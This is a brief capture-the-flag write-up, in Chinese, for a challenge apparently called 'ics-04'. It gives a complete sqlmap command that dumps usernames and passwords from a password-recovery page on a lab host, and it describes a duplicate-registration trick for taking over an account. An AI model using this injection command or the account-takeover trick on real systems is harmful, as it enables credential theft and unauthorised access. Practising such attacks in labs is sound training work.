
# ics-04

* 找回密码功能：存在sql注入
> python sqlmap.py -u "http://111.198.29.45:30842/findpwd.php" --data="username=1" -D cetc004 -T user -C "username,password" --dump

* 利用重复注册账号漏洞，注册账号c3tlwDmIn23，密码123456
